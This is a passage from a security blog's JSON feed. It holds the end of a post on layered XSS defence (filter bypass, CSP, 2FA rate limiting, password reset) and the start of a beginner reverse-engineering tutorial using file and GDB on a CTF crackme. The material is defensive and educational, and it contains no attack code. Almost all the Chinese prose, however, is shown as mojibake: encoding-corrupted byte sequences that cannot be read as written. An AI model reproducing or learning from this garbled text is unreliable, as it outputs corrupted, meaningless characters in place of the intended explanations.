éæ¿¾è¦å‰‡æœ‰æ²’æœ‰å¯èƒ½æœ‰æ¼æ´ï¼Œæœƒè¢«ç¹éï¼Ÿæœ‰çš„è©±åˆè©²æ€éº¼ç¹ï¼Ÿ</li>\n<li>å„˜ç®¡éƒ½éæ¿¾äº†ï¼Œæœƒä¸æœƒå…¶å¯¦ server side çš„æ¼æ´å¯ä»¥å¹«å¿™ç¹éï¼Ÿä¾‹å¦‚èªª double encoding</li>\n<li>CSP è¨­å¾—å¤ åš´è¬¹å—ï¼Ÿæœ‰æ²’æœ‰ç¾æˆçš„ç¹éæ–¹å¼ï¼Ÿ</li>\n<li>2FA æ©Ÿåˆ¶æœ‰å¯¦ä½œå®Œæ•´å—ï¼Ÿrate limit æœ‰è¨­å¥½å—ï¼Ÿæ²’æœ‰è¨­çš„è©±æ˜¯ä¸æ˜¯æš´åŠ›ç ´è§£å°±è¢«çˆ†ç ´äº†ï¼Ÿ</li>\n<li>å¿˜è¨˜å¯†ç¢¼çš„æ©Ÿåˆ¶æœ‰å¯¦ä½œæ­£ç¢ºå—ï¼Ÿæœƒä¸æœƒå¯ä»¥ç”¨åˆ¥äººçš„èº«ä»½å¹«å¿™é‡è¨­å¯†ç¢¼ï¼Ÿ</li>\n</ol>\n<p>XSS ä¸¦ä¸æ˜¯å…¨æœ‰æˆ–æ˜¯å…¨ç„¡é€™éº¼ç°¡å–®ï¼Œæœ‰çš„ç¶²ç«™é›–ç„¶è¢« XSSï¼Œä½†å½±éŸ¿ç¯„åœæœ‰é™ï¼Œè€Œæœ‰çš„ç¶²ç«™ä¸€è¢« XSSï¼Œé€£ä½¿ç”¨è€…çš„å¸³è™Ÿå¯†ç¢¼éƒ½å¯ä»¥è¼•æ˜“æ›´æ”¹ï¼Œç›´æ¥æŠŠå¸³è™Ÿçµ¦æ¶éä¾†ã€‚</p>\n<p>åœ¨é˜²ç¦¦ XSS çš„æ™‚å€™ï¼Œå¦‚æœåªé˜²ç¦¦äº†ç¬¬ä¸€é—œï¼Œåªæœ‰æƒ³åˆ°ã€Œæˆ‘è¦æŠŠ render çš„å…§å®¹ escapeã€å°±å®¹æ˜“é€ æˆä¸Šé¢æ‰€è¬›çš„ç‹€æ³ï¼Œè¦å˜›å°±æ˜¯æ•´å€‹ç¶²ç«™éƒ½å¾ˆå®‰å…¨é€£ XSS éƒ½æ²’æœ‰ï¼Œè¦å˜›å°±æ˜¯ä¸€è¢«æ‰“å‡º XSSï¼Œæ•´å€‹ç¶²ç«™å°±è¢«æ‰“ç©¿ã€‚</p>\n<p>æ‰€ä»¥åœ¨é˜²ç¦¦çš„æ™‚å€™å¿…é ˆæ³¨æ„åˆ°ä¸Šé¢æçš„é€™äº›ä¸åŒçš„ç’°ç¯€ï¼Œé‡å°æ¯å€‹ç’°ç¯€éƒ½å»åšé˜²ç¦¦ï¼Œè¨­ä¸‹å¤šå€‹é˜²ç·šã€‚å°±ç®—æ”»æ“Šè€…å¯ä»¥çªç ´ç¬¬ä¸€é—œï¼Œå¯èƒ½ä¹Ÿæœƒè¢«ç¬¬äºŒé—œçš„ CSP æ“‹ä¸‹ï¼Œç„¡æ³•åŸ·è¡Œ JSï¼›å°±ç®—ç¬¬äºŒé—œè¢«ç ´äº†ï¼Œé‚„æœ‰ç¬¬ä¸‰é—œå®ˆè‘—ï¼Œé™ä½ XSS çš„å½±éŸ¿ç¨‹åº¦ï¼Œä¸æœƒå› ç‚ºä¸€å€‹æ¼æ´å°±è®“ä½¿ç”¨è€…çš„å¸³æˆ¶æ•´å€‹è¢«æ¶èµ°ã€‚</p>\n",
      "date_published": "2021-06-17T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/reverse-01/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/reverse-01/",
      "title": "Reverse Engineering 101â€Šâ€”â€ŠPart 1",
      "content_html": "<!-- summary -->\n<!-- å¾ˆå¤šäººå°é€†å‘å·¥ç¨‹èºèºæ¬²è©¦å»ä¸çŸ¥é“å¾ä½•é–‹å§‹ï¼Œåˆè©²å…·å‚™å“ªäº›çŸ¥è­˜ï¼Ÿé€™ä¸€ç¯‡æ–‡ç« æœƒå¾é€†å‘ä¸€å€‹å°ç¨‹å¼ï¼Œå¸¶ä½ å»ºç«‹åŸºç¤çŸ¥è­˜èˆ‡æƒ³æ³•ï¼ -->\n<!-- summary -->\n<p>æœ€è¿‘è§£ä¸€äº› CTF é †ä¾¿è·ŸåŒäº‹åˆ†äº« Reversing çš„ä¸€é»åŸºç¤æŠ€å·§ï¼Œæƒ³èªªå¯«æˆæ–‡ç« åˆ†äº«ä¸€ä¸‹ã€‚é€™ç¯‡æ˜¯çµ¦æŠ€è¡“å°ç™½çš„ Reversing å…¥é–€ç³»åˆ—ï¼Œé›¶åŸºç¤ç¬¬ä¸€èª²ï¼</p>\n<p>æœ¬ç¯‡æœƒç”¨åˆ°çš„å·¥å…·æœ‰ï¼š</p>\n<ol>\n<li>linux æˆ– Unix-like ä½œæ¥­ç³»çµ±</li>\n<li>GDBï¼ˆGNU Debuggerï¼‰ï¼Œä¸€å€‹ä¸ç®¡éœæ…‹é‚„æ˜¯å‹•æ…‹åˆ†æéƒ½å¾ˆå¥½ç”¨çš„ linux å…§å»ºå·¥å…·</li>\n<li>æ»¿æ»¿çš„å¥½å¥‡å¿ƒï¼</li>\n</ol>\n<h2 id=\"%E8%A9%B2%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E8%A9%B2%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%EF%BC%9F\">#</a> è©²å¦‚ä½•é–‹å§‹ï¼Ÿ</h2>\n<p>ä»¥ä¸‹ä»¥ä¸€å€‹ç°¡å–®çš„<a href=\"https://github.com/OneDegree-Global/medium-resources/tree/main/reverse-101\">å°ç¨‹å¼</a>ç‚ºä¾‹ã€‚</p>\n<p>ä»Šå¤©æ‹¿åˆ°ä¸€å€‹æœªçŸ¥çš„æª”æ¡ˆï¼Œæˆ‘å€‘è©²å¾ä½•ä¸‹æ‰‹å‘¢ï¼Ÿé¦–å…ˆï¼Œè¦çŸ¥é“æˆ‘å€‘çš„ç›®æ¨™æ˜¯ä»€éº¼æ¨£çš„æª”æ¡ˆã€‚æˆ‘å€‘å¯ä»¥ç”¨ linux å…§å»ºçš„ <code>file</code> æŒ‡ä»¤ä¾†è¾¨è­˜æª”æ¡ˆé¡å‹ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/file.png\" /><figcaption><p>file æŒ‡ä»¤</p>\n</figcaption></figure></p>\n<p>ä¾‹å¦‚å¾ä¸Šåœ–ä¸­æˆ‘å€‘å¯ä»¥è§€å¯Ÿåˆ°å¹¾ä»¶äº‹ï¼š</p>\n<ol>\n<li>\n<p>é€™æ˜¯ä¸€å€‹ ELF æª”æ¡ˆï¼ˆExecutable Linkable Formatï¼‰ï¼Œæ˜¯ Unix ç³»çµ±ä¸Šå¸¸è¦‹çš„ binary åŸ·è¡Œæª”ã€å…±ç”¨å‡½å¼åº«ã€æˆ–æ˜¯ object code é¡å‹ï¼Œä¹Ÿæ„å‘³é€™æˆ‘å€‘å¯ä»¥ç›´æ¥åœ¨ linux ç³»çµ±ä¸ŠæŠŠä»–è·‘èµ·ä¾† <sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup></p>\n</li>\n<li>\n<p>è¨˜æ†¶é«”çš„ä½å…ƒçµ„é †åºï¼ˆEndiannessï¼‰æ¡ LSBï¼ˆLeast Significant Bitï¼‰ï¼Œæˆ–æ˜¯å¸¸èªªçš„ little endianï¼Œè¡¨ç¤ºæŠŠæœ€é«˜ä½çš„ä½å…ƒçµ„æ”¾åœ¨æœ€é«˜çš„è¨˜æ†¶é«”ä½å€ä¸Šï¼Œå¦‚ä¸‹åœ–æ‰€ç¤ºã€‚é€™è¡¨ç¤ºç•¶æˆ‘å€‘è¼¸å…¥ <code>1234</code> çš„æ™‚å€™ï¼Œåœ¨ GDB ç­‰è»Ÿé«”è£¡è§€å¯Ÿè¨˜æ†¶é«”æ™‚æœƒçœ‹åˆ°çš„æ˜¯ <code>\\x34\\x33\\x32\\x31</code>ï¼Œé€™éƒ¨åˆ†æˆ‘å€‘ç­‰ç­‰ç”¨ GDB æœƒå†çœ‹åˆ°ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/little-endian.png\" /><figcaption><p>åœ–ç‰‡ä¾†è‡ª <a href=\"https://blog.gtwang.org/programming/difference-between-big-endian-and-little-endian-implementation-in-c/\">é€™ç¯‡æ–‡ç« </a></p>\n</figcaption></figure></p>\n</li>\n<li>\n<p>libc å‡½æ•¸çš„èª¿ç”¨ç‚º dynamically linkedï¼Œäº¦å³ç¨‹å¼è·‘èµ·ä¾†çš„æ™‚å€™ï¼Œä½œæ¥­ç³»çµ±æ‰æœƒåš linkingï¼ŒæŠŠå„å€‹è¦èª¿ç”¨çš„ libc å‡½æ•¸çš„ä½ç½®å¡«åˆ°é€™éš»ç¨‹å¼çš„ä¸€å¼µè¡¨è£¡ï¼Œæ–¹ä¾¿åŸ·è¡Œæ™‚æŸ¥è©¢å‘¼å«ã€‚å¦‚æœæ˜¯ statically linkedï¼Œåœ¨ç·¨è­¯éç¨‹ä¸­å°±æœƒç›´æ¥æŠŠé€™äº›å¤–éƒ¨å‡½æ•¸éƒ½ä¸€èµ·åŒ…åˆ°ç¨‹å¼è£¡é¢ï¼Œç”¢å‡ºä¸€å€‹æ¯”è¼ƒè‚¥å¤§çš„æª”æ¡ˆã€‚å°±åƒæœ‰äººè£½ä½œç­†è¨˜æ™‚ï¼ŒæœƒæŠŠèª²æœ¬å…§å®¹æŠ„åˆ°ç­†è¨˜æœ¬ä¸Šï¼Œé€™æ¨£æ‰€æœ‰è³‡æ–™ä¸€ç›®ç­ç„¶ï¼Œé¦¬ä¸Šå°±èƒ½æ‰¾åˆ°ï¼Œç¼ºé»æ˜¯ç­†è¨˜åšåšä¸€æœ¬ï¼›ä¹Ÿæœ‰äººåƒ…æ˜¯æ¨™è¨»å°æ‡‰çš„èª²æœ¬é æ•¸ï¼Œé€™æ¨£ç­†è¨˜è¼ƒç‚ºç²¾ç°¡è¼•ä¾¿ï¼Œä¸éç¼ºé»æ˜¯è¦æ‰¾è³‡æ–™æ™‚å¿…é ˆå¦å¤–åƒç…§èª²æœ¬ã€‚<sup class=\"footnote-ref\"><a href=\"#fn2\" id=\"fnref2\">[2]</a></sup></p>\n</li>\n<li>\n<p>è·‘åœ¨ x86â€“64 ï¼ˆ64 bitsï¼‰çš„çµæ§‹ä¸Šï¼Œ64 bits è·Ÿ 32 bits ä¸åªåœ¨æš«å­˜å™¨åç¨±ä¸Šä¸åŒï¼Œåœ¨ system call çš„å‘¼å«ä¸Šä¹Ÿä¸ä¸€æ¨£ã€‚</p>\n</li>\n<li>\n<p><code>not stripped</code>ï¼Œè¡¨ç¤ºåœ¨ç·¨è­¯éç¨‹ä¸­ï¼Œdebugging è³‡è¨Šæ²’æœ‰è¢«å»æ‰ï¼Œæˆ‘å€‘é‚„çœ‹çš„åˆ°å„å€‹å‡½æ•¸è·Ÿè®Šæ•¸çš„åç¨±ç­‰ç­‰ã€‚</p>\n</li>\n</ol>\n<p>æ¥è‘—å°±å¯ä»¥åŸ·è¡Œçœ‹çœ‹ï¼è·‘èµ·ä¾†å¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œæœƒå…ˆè·Ÿä½¿ç”¨è€…è¦ä¸‰å€‹æ•¸å­—ï¼Œç„¶å¾Œé€²è¡ŒæŸäº›åˆ¤æ–·ï¼ŒéŒ¯èª¤å°±æœƒåƒé€™æ¨£å°å‡º â€˜nope.â€™ã€‚å› æ­¤ï¼Œæˆ‘å€‘å¯ä»¥åˆ¤æ–·æ‹¿åˆ° flag çš„æ¢ä»¶å°±æ˜¯è®“é€™ä¸‰å€‹æ•¸å­—ç¬¦åˆæŸäº›é—œä¿‚ï¼Œæª¢æŸ¥é€šéäº†å°±æœƒå°å‡º flagã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/execution.png\" /><figcaption><p>adder è·‘èµ·ä¾†ï¼</p>\n</figcaption></figure></p>\n<hr>\n<h2 id=\"gdb-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F%E8%83%BD%E5%90%83%E5%97%8E%EF%BC%9F\"><a class=\"direct-link\" href=\"#gdb-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F%E8%83%BD%E5%90%83%E5%97%8E%EF%BC%9F\">#</a> GDB æ˜¯ä»€éº¼ï¼Ÿèƒ½åƒå—ï¼Ÿ</h2>\n<p>GDB çš„å…¨åæ˜¯ GNU Debuggerï¼Œé¡§åæ€ç¾©å°±æ˜¯å¯ä»¥è®“ä½ ä¸€é‚ŠåŸ·è¡Œä¸€å€‹æª”æ¡ˆä¸€é‚Šçœ‹åˆ°è£¡é¢çš„ç´°ç¯€ï¼Œä¹Ÿå¯ä»¥è¨­ç½®ä¸­æ–·é»ä¾†é€æ­¥æª¢è¦–è¨˜æ†¶é«”è£¡é¢å­˜çš„æ±è¥¿è·ŸåŸ·è¡Œé †åºï¼Œæ–¹ä¾¿é–‹ç™¼è€…æŠ“èŸ²ã€‚ä»–é‚„æœ‰å¾ˆå¤šå¼·å¤§çš„åŠŸèƒ½è·Ÿæ’ä»¶ï¼Œä¾‹å¦‚æœ€å¸¸ç”¨çš„ pedaã€gefã€pwndbg ç­‰ç­‰ï¼Œå¯ä»¥è®“ä½ å¾ˆæ–¹ä¾¿åœ°çœ‹åˆ°ä¸åŒå€æ®µçš„è³‡æ–™ç”šè‡³ç”¢ç”Ÿ shellcode ï¼Œå¤§å®¶å¦‚æœæœ‰èˆˆè¶£å¯ä»¥å†å»é€›é€›ã€‚</p>\n<p>é¦–å…ˆï¼ŒåŸ·è¡Œ <code>gdb &lt;filename&gt;</code> å°±å¯ä»¥åœ¨ GDB è£¡é¢è¼‰å…¥é€™å€‹åŸ·è¡Œæª”ã€‚å†ä¾†å°±æ˜¯ç”¨ <code>info file</code> ä¾†è§€å¯Ÿé€™å€‹ç¨‹å¼çš„é€²å…¥é»è·Ÿå„å€æ®µä½ç½®<sup class=\"footnote-ref\"><a href=\"#fn3\" id=\"fnref3\">[3]</a></sup>ã€‚ç·¨è­¯å™¨é‹ä½œæ™‚ï¼ŒæœƒæŠŠè² è²¬é‚è¼¯çš„ç¨‹å¼ç¢¼è·Ÿè®Šæ•¸ç­‰è³‡æ–™åˆ†å€å­˜æ”¾ä¸¦åŠ ä¸Šå°æ‡‰çš„æ¨™ç±¤ä»¥ä¾›ç¨‹å¼é‹è¡Œæ™‚å­˜å–ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/gdb-info.png\" /><figcaption><p>info file çµæœ</p>\n</figcaption></figure></p>\n<p>é€šå¸¸æˆ‘å€‘æœƒæ³¨æ„çš„å¹¾å€‹æ¯”è¼ƒé‡è¦çš„å€æ®µç‚ºï¼š</p>\n<p>1.Â <code>.text</code>ï¼šæ”¾ç½®å¯åŸ·è¡Œçš„ç¨‹å¼ç¢¼ã€‚æ¬Šé™ç‚ºå”¯è®€ã€‚</p>\n<p>2.Â <code>.rodata</code>ï¼šå·²åˆå§‹åŒ–çš„è³‡æ–™ï¼Œä¾‹å¦‚ä½ åœ¨ç¨‹å¼è£¡é¢å¯«æ­»çš„å­—ä¸²æˆ–æ˜¯å¸¸æ•¸ã€‚æ¬Šé™ç‚ºå”¯è®€ã€‚</p>\n<p>3.Â <code>.data</code>ï¼šå·²åˆå§‹åŒ–çš„è³‡æ–™ï¼Œä¾‹å¦‚ä½ åœ¨ç¨‹å¼è£¡é¢ä½¿ç”¨çš„å…¨åŸŸè®Šæ•¸ã€‚æ¬Šé™ç‚ºå¯è®€å¯å¯«ã€‚</p>\n<p>4.Â <code>.bss</code>ï¼šæœªåˆå§‹åŒ–çš„è³‡æ–™ã€‚æ¬Šé™ç‚ºå¯è®€å¯å¯«ã€‚</p>\n<p>æˆ‘å€‘çŸ¥é“é–‹å§‹åŸ·è¡Œçš„åœ°æ–¹æ˜¯ <code>0x400860</code> å¾Œï¼Œå°±å¯ä»¥ç”¨ <code>disas</code> åç·¨è­¯é€™æ®µç¨‹å¼ç¢¼ã€‚</p>\n<p><img src=\"/img/posts/crystal/reverse-01/disas-start.png\" alt=\"\"></p>\n<p>æˆ‘å€‘æœƒè§€å¯Ÿåˆ°é€™å€‹å‡½æ•¸æœ‰ä¸€å€‹åå­— <code>_start</code>ã€‚ä¹‹å‰èªªéï¼Œ<code>not stripped</code> è¡¨ç¤ºå‡½æ•¸åç¨±éƒ½æœ‰è¢«ä¿ç•™ï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿå¯ä»¥ç”¨å‡½æ•¸åç¨±ç•¶ä½œ reference å°è±¡ï¼Œåœ¨åç·¨è­¯è·Ÿè¨­ä¸­æ–·é»çš„æ™‚å€™ä½¿ç”¨é€™å€‹åç¨±ã€‚</p>\n<p>ä½†æ˜¯æˆ‘å€‘çš„ç¨‹å¼è£¡é¢æ²’æœ‰å¯«åˆ° <code>_start</code> é€™å€‹å‡½æ•¸å•Šï¼Œä»–æ˜¯å“ªè£¡ä¾†çš„å‘¢ï¼Ÿå…¶å¯¦åœ¨ç·¨è­¯çš„éç¨‹ä¸­ï¼Œç·¨è­¯å™¨æœƒåŠ å…¥ä¸€å€‹é€²å…¥é» <code>_start</code> å‡½æ•¸ï¼Œè² è²¬åˆå§‹åŒ–ä¸€äº› gcc/glibc çš„æº–å‚™å·¥ä½œå†å‘¼å«æˆ‘å€‘çš„ <code>main</code>ï¼Œå¯ä»¥æƒ³æˆæ˜¯åœ¨æˆ‘å€‘çš„ç¨‹å¼å¤–å¤šåŠ ä¸€å±¤åŒ…è£ä¾†æ•´é “å¥½ç’°å¢ƒå†é–‹å§‹åŸ·è¡Œä¸»é‚è¼¯ã€‚æ‰€ä»¥ï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ°åœ¨ <code>&lt;+36&gt;</code> çš„åœ°æ–¹å‘¼å« <code>&lt;__libc_start_main@plt&gt;</code>ï¼Œå…¶å¯¦ä¹Ÿå°±æ˜¯é€é libc çš„å‡½æ•¸å†é–“æ¥å‘¼å«æˆ‘å€‘æ‰€æ’°å¯«çš„ä¸»ç¨‹å¼ <code>main</code>ã€‚</p>\n<p>é€™è£¡æˆ‘å€‘æ‰“å€‹å²”ï¼Œå›å»çœ‹ä¸€ä¸‹å‰é¢æåˆ°çš„ little endianã€‚ä¸‹é¢é€™å¼µåœ–æ˜¯åœ¨ GDB è£¡é¢ç”¨ <code>x/&lt;num&gt;&lt;unit&gt; addr</code> å»çœ‹è¨˜æ†¶é«”çš„æŒ‡ä»¤ï¼Œunit æœ‰ bï¼ˆbytes = 1 byteï¼‰ã€hï¼ˆhalfword = 2 bytesï¼‰ã€wï¼ˆword = 4 bytesï¼‰ã€gï¼ˆgiant word = 8 bytesï¼‰é€™å¹¾ç¨®ï¼Œè¡¨ç¤ºä¸€æ¬¡çœ‹çš„å–®ä½æ˜¯å¤šå°‘ä½å…ƒï¼Œå‰é¢çš„ num å°±æ˜¯çœ‹å¤šå°‘å–®ä½ï¼Œæ‰€ä»¥ <code>x/4x 0x400cd0</code>å°±æ˜¯å¾åœ°å€ <code>0x400cd0</code>é–‹å§‹è®€å– 4 å€‹ 4 byte çš„è¨˜æ†¶é«”ã€‚unit é è¨­æ˜¯ wï¼Œx å°±æ˜¯å»¶çºŒç”¨æœ€å¾Œä¸€æ¬¡è¨­çš„å–®ä½ã€‚</p>\n<p><img src=\"/img/posts/crystal/reverse-01/gdb-endian.png\" alt=\"\"></p>\n<p>æˆ‘å€‘çœ‹åˆ°ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€å¡Šè¨˜æ†¶é«”æ˜¯ç´…è‰²æ¡†èµ·ä¾†çš„ <code>0x65746e45</code>ï¼Œç¬¬äºŒå¡Šè¨˜æ†¶é«”æ˜¯é»ƒè‰²æ¡†èµ·ä¾†çš„ <code>0x68742072</code>ï¼Œé‚£ç¬¬ä¸‰è¡Œä¸€æ¬¡è®€ 8 bytes çš„æ™‚å€™æ€éº¼é †åºäº¤æ›è®Šæˆé»ƒè‰²æ¡†åœ¨å‰é¢äº†å‘¢ï¼Ÿ</p>\n<p>é‚£å°±æ˜¯å› ç‚º little endian å¿…é ˆåéä¾†è®€ï¼Œæˆ‘å€‘çœ‹åˆ°çš„ <code>\\x65\\x74\\x6e\\x45</code> åœ¨è¨˜æ†¶é«”è£¡é¢å­˜çš„å…¶å¯¦æ˜¯ <code>\\x45\\x6e\\x74\\x65</code>ï¼Œæ‰€ä»¥æŠŠç¬¬ä¸€è¡Œçš„æ¡†æ¡†å€‘å¾å±è‚¡è®€å›ä¾†ï¼Œé»ä¸€èµ·å°±æ˜¯ <code>\\x45\\x6e\\x74\\x65 \\x72\\x20\\x74\\x68</code>ï¼Œå°±æ˜¯ç¬¬ä¸‰è¡Œçš„ç¬¬ä¸€å€‹å–®ä½åéä¾†çš„æ¨£å­å•¦ï¼å¤§å®¶è¨˜å¾—ä¸è¦è®€åå›‰ï¼</p>\n<hr>\n<h2 id=\"%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98%EF%BC%9A%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E8%88%87%E8%A8%88%E7%AE%97%E6%A9%9F%E7%B5%90%E6%A7%8B\"><a class=\"direct-link\" href=\"#%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98%EF%BC%9A%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E8%88%87%E8%A8%88%E7%AE%97%E6%A9%9F%E7%B5%90%E6%A7%8B\">#</a> åŸºç¤çŸ¥è­˜ï¼šçµ„åˆèªè¨€èˆ‡è¨ˆç®—æ©Ÿçµæ§‹</h2>\n<p>æ¥ä¸‹ä¾†ï¼Œåœ¨é€²åˆ° <code>main</code> ä¹‹å‰ï¼Œå…ˆä¾†è¬›è¬›ä¸€é»åŸºæœ¬çš„çµ„åˆèªè¨€èˆ‡è¨ˆç®—æ©Ÿçµæ§‹ã€‚</p>\n<p>çµ„åˆèªè¨€æ˜¯ä»‹æ–¼æ©Ÿå™¨çœ‹å¾—æ‡‚çš„äºŒé€²ä½æ“ä½œç¢¼ï¼ˆopcodeï¼‰èˆ‡ä¸€èˆ¬äººçœ‹å¾—æ‡‚çš„é«˜éšç¨‹å¼èªè¨€ä¸­é–“çš„ä¸€ç¨®ä½éšèªè¨€ï¼Œç›®çš„æ˜¯è®“äºŒé€²ä½çš„ç¨‹å¼è®Šå¾—å¯ä»¥é–±è®€èˆ‡ç·¨è¼¯ã€‚ç”±æ–¼æ¯ä¸€ç¨® CPU ä½¿ç”¨çš„æ©Ÿå™¨æŒ‡ä»¤ï¼ˆmachine instructionï¼‰éƒ½ä¸åŒï¼Œæ‰€ä»¥å°æ‡‰çš„çµ„åˆèªè¨€ä¹Ÿä¸ä¸€æ¨£ï¼Œé€™è£¡æˆ‘å€‘ä»¥ x86â€“64 ç‚ºä¾‹ä»‹ç´¹ï¼Œé‡åˆ°ä¸æ‡‚æˆ–æ²’çœ‹éçš„éƒ½å¯ä»¥å»æŸ¥æŒ‡ä»¤é›†å“¦ã€‚<sup class=\"footnote-ref\"><a href=\"#fn4\" id=\"fnref4\">[4]</a></sup></p>\n<p>æœ€å¸¸è¦‹çš„æŒ‡ä»¤å¦‚ä¸‹ï¼Œ<code>S</code> æŒ‡ sourceï¼Œ<code>D</code> æŒ‡ destinationï¼š</p>\n<ul>\n<li><code>mov D, S</code>ï¼šå°‡æŸå€‹å€¼æˆ–æ˜¯è¨˜æ†¶é«”çš„ä½ç½®å¯«å…¥æŸå€‹æš«å­˜å™¨ã€‚æŠŠ <code>S</code> è£¡é¢çš„å€¼å¯«åˆ° <code>D</code>è£¡é¢ã€‚</li>\n<li><code>push S</code>ï¼šå°‡ <code>S</code> è£¡é¢çš„å€¼æ”¾åˆ° stack ä¸Šã€‚</li>\n<li><code>pop D</code>ï¼šæŠŠ stack ä¸Šçš„å€¼æ”¾åˆ° <code>D</code> è£¡é¢ï¼Œå¾ stack ç§»é™¤ã€‚</li>\n<li><code>add D, S</code>ã€<code>sub D, S</code>ï¼šå°‡ <code>S</code> è·Ÿ <code>D</code> è£¡é¢çš„å€¼ç›¸åŠ ç›¸æ¸›ï¼Œçµæœæ”¾åœ¨ <code>D</code> è£¡é¢ã€‚</li>\n<li><code>call Label</code>ï¼šå‘¼å«å¸¶æœ‰ Label æ¨™ç±¤çš„å‡½æ•¸ï¼Œé€™æ™‚ç¨‹å¼æœƒç‚ºé€™å€‹å‡½æ•¸å‰µä¸€å€‹æ–°çš„ stack frameã€‚</li>\n<li><code>ret</code>ï¼šçµ‚æ­¢ç•¶å‰å‡½æ•¸çš„åŸ·è¡Œï¼Œè¿”å›åˆ°ä¸Šä¸€å±¤çš„å‡½æ•¸ã€‚</li>\n</ul>\n<p>é‚„æœ‰é€²è¡Œæ¢ä»¶åˆ¤æ–·çš„ <code>cmp</code>ã€<code>test</code> è·Ÿå„ç¨®è·³èºçš„ <code>jmp</code> å®¶æ—ï¼Œä¹‹å¾Œæˆ‘å€‘é‡åˆ°å†èªªæ˜ã€‚</p>\n<p>è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢çš„å¯«æ³•æ˜¯ Intel èªæ³•ï¼Œå¦‚æœæ˜¯ AT&amp;T èªæ³•å°±å°‡ <code>S</code> è·Ÿ <code>D</code>åéä¾†ï¼ˆå¦‚ <code>mov S,D</code>ï¼‰ã€‚</p>\n<p>é¦–å…ˆï¼Œæˆ‘å€‘å¿…é ˆå…ˆç†è§£æš«å­˜å™¨èˆ‡è¨˜æ†¶é«”ã€‚CPU åªè·‘æŒ‡ä»¤ï¼Œè€Œè³‡æ–™å„²å­˜äº¤çµ¦è¨˜æ†¶é«”ï¼Œç•¶ CPU éœ€è¦ç”¨åˆ°è³‡æ–™æ™‚å°±æœƒå‘è¨˜æ†¶é«”è«‹æ±‚ã€‚æˆ‘å€‘å¯ä»¥æŠŠè¨˜æ†¶é«”æƒ³åƒæˆä¸€é–“å¾ˆå°çš„åœ–æ›¸é¤¨ï¼Œé–€å£æœ‰ä¸€å€‹æ«ƒå­æ”¾æœ¬é€±æœ€ç†±é–€çš„æ›¸ç±ï¼Œé€²é–€å¾Œä¸€æ¨“æ”¾å„å€‹è€å¸«æŒ‡å®šçš„èª²æœ¬èˆ‡åƒè€ƒè³‡æ–™ï¼Œå…¶ä»–æ›¸ç±éƒ½æ”¾åœ¨åœ°ä¸‹å€‰åº«å…§ã€‚é‚£éº¼ä»Šå¤©æœ‰å­¸ç”Ÿæƒ³å€Ÿæ›¸ï¼Œä»–è¦æ˜¯åœ¨é–€å£ä¸€çœ‹å°±èƒ½æ‰¾åˆ°æƒ³è¦çš„é‚£æœ¬ç•¶ç„¶æ˜¯æœ€æœ‰æ•ˆç‡çš„ï¼Œä¸ç„¶ä»–å°±å¾—èµ°é€²å»ï¼Œåœ¨å±¤æ¶é–“ä»”ç´°ç¿»æ‰¾ï¼Œä¹Ÿè¨±è¦ä¸€å€‹å°æ™‚æ‰èƒ½æ‰¾åˆ°ã€‚è¦æ˜¯æ›´æ…˜éƒ½æ²’æœ‰ï¼Œé‚„è¦å‹ç…©ç®¡ç†å“¡åˆ°å€‰åº«è£¡æœå°‹ï¼Œèªªä¸å®šè¦ä¸€å…©å¤©åŠŸå¤«æ‰è¡Œã€‚è¶Šå¤šçš„è³‡æ–™é‡æŸ¥è©¢èµ·ä¾†è¶Šæ²’æœ‰æ•ˆç‡ï¼Œåä¹‹ï¼Œè¶Šå°‘çš„è³‡æ–™è¶Šèƒ½å¿«é€Ÿå­˜å–ã€‚</p>\n<p>è¨˜æ†¶é«”å¸¸è¦‹çš„çµæ§‹å¦‚ä¸‹åœ–ã€‚æœ€ä¸Šå±¤æ˜¯ CPU æš«å­˜å™¨ï¼ˆregisterï¼‰ï¼Œæ˜¯å­˜å–æœ€å¿«é€Ÿé »ç¹ä¹Ÿæœ€å°çš„è¨˜æ†¶é«”ã€‚å†å¾€ä¸‹è‡³å¿«å–ï¼ˆcacheï¼‰ã€RAMã€ hard drive ï¼Œèƒ½å­˜çš„è³‡æ–™è¶Šä¾†è¶Šå¤šã€é«”ç©è¶Šä¾†è¶Šå¤§ã€å­˜å–é€Ÿåº¦ä¹Ÿè¶Šä¾†è¶Šæ…¢ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/memory-model.png\" /><figcaption><p>memory modelï¼Œå–è‡ª<a href=\"https://www.itread01.com/content/1548607715.html\">çµ„åˆèªè¨€å…¥é–€æ•™ç¨‹</a></p>\n</figcaption></figure></p>\n<p>è¦çœ‹æ‡‚çµ„åˆèªè¨€ï¼Œé¦–è¦ä¹‹å‹™å°±æ˜¯äº†è§£æš«å­˜å™¨ã€‚</p>\n<p>åœ¨ x86â€“64 çµæ§‹ä¸‹ï¼Œæš«å­˜å™¨éƒ½æ˜¯ 64 bits = 8 bytes å¤§å°<sup class=\"footnote-ref\"><a href=\"#fn5\" id=\"fnref5\">[5]</a></sup>ï¼Œæš«å­˜å™¨ä¹Ÿå¯ä»¥éƒ¨åˆ†å­˜å–ï¼Œä»¥ <code>rax</code> ç‚ºä¾‹ï¼Œ<code>eax</code> æŒ‡ <code>rax</code> çš„å¾Œ 4 bytesã€å†å°åˆ‡å¾—åˆ° <code>ax</code> ç‚ºå€’æ•¸ 2 